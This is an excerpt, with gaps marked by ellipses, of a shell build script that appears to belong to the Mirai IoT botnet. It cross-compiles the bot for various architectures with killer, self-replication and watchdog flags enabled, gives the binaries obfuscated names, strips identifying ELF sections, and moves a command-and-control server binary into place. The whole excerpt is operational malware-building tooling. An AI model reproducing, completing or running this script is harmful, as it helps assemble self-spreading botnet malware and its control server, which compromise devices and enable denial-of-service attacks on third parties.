...
compile_bot() {
    ...
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -DMIRAI_BOT_ARCH=\""$1"\" -o release/"$2" -lpthread
...
if [ -d "/root/cnc" ]; then
	...
	if [ -f "/root/loader/cnc" ]; then
		rm -rf /root/cnc
		mv /root/loader/cnc /root/cnc
	else
		echo "CNC binary not found."
		exit 1
	fi
else
	echo "CNC source directory not found at /root/cnc"
	exit 1
fi
...
echo "Building - sparc"
if ! command -v sparc-gcc &>/dev/null; then
    echo "Compiler sparc-gcc not found, skipping sparc build."
else
    sparc-gcc -std=c99 -DKILLER -DSELFREP -DWATCHDOG bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections -DMIRAI_BOT_ARCH=\"sparc\" -o release/FGx8SNCa4txePA.spc -lpthread
    if command -v sparc-strip &>/dev/null; then
        sparc-strip release/FGx8SNCa4txePA.spc -S --strip-unneeded \
            --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note \
            --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr \
            --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr \
            --remove-section=.eh_frame_hdr
